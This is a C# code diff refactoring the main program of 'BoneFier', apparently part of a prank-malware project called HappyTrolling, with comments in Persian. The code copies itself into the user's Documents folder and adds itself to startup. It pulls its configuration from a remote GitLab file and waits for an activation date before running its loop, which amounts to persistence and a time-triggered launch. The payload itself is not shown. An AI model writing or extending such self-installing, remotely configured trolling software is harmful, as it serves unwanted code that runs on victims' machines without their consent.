@@ -6,13 +6,17 @@ using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading.Tasks;
 using ReflectionClassOverriding;
-using BoneFierApp.Components.HappyTrolling;
+using BoneFier;
+using BoneFier.Basic;
 
-namespace BoneFierApp
+namespace BoneFier
 {
     internal class Program
     {
         //cloud data = https://gitlab.com/AliiMohammadi/happytrolling/-/raw/main/RemoteDataHappyTrolling.txt
+
+        public static Application application;
+        public static Emigrator emigrator;
 
         public static bool Debug = false;
 
@@ -20,49 +24,35 @@ namespace BoneFierApp
         {
             Start();
         }
-        static void Start ()
+        static void Start()
         {
-            RemoteData ProgramData;
+            application = new Application();
 
-            //گرفتن اطلاعات از سرور یا پیش فرض 
-            string Cloudstring = new CloudReader().Read(@"https://gitlab.com/AliiMohammadi/happytrolling/-/raw/main/RemoteDataHappyTrolling.txt");
-                
-            if (!String.IsNullOrWhiteSpace(Cloudstring)) 
-                    ProgramData = JsonHelper.Deserialize<RemoteData>(Cloudstring); // اطلاعات جدید رو از سرور میگیره
-            else
-                ProgramData = new RemoteData(); //در غیر اطلاعات پیش فرض رو میگیره
-
-            HappyTrolling.Remotedata = ProgramData;
-
-            AppActions BONEFIER = new AppActions(HappyTrolling.Remotedata.Activationdate.ToDateTime());
+            application.UpdateAppConfig();
 
             //ادرس پیش فرض مهاجرت :
             // Documents/ApplicationName.exe
-            BONEFIER.Emigrate(BONEFIER.EmigrationPath);
+            emigrator = new Emigrator();
+            emigrator.Emigrate();
 
-            S_Actions.ChekStartUp("Bonefier" , BONEFIER.TargetPath);//استارت اپ
+            kernel.ChekStartUp(emigrator.ApplicationName, emigrator.TargetPath);//استارت اپ
 
             if (!Debug)
             {
                 //برسی تاریخ فعال سازی
-                if (AppActions.CheckActivationDay(BONEFIER.ActivationDate)) 
+                if (Calendarmanager.CheckActivationDay(application.ApplicationConfig.Activationdate.ToDateTime()))
                 {
-                    RunTimeLoop.StartLoop();//فعال سازی
+                    RunTimeLoop.StartLoop(application.ApplicationConfig.LoopFrec); //فعال سازی
                 }
                 else
                 {
-                    AppActions.Exit();//خروج اگر اون روز نیست
+                    Application.Exit();//خروج اگر اون روز نیست
                 }
             }
             else
             {
-                RunTimeLoop.StartLoop();
+                RunTimeLoop.StartLoop(application.ApplicationConfig.LoopFrec);
             }
-        }
-
-        static void Log(object mess)
-        {
-            Trace.WriteLine(mess);
         }
     }
 }
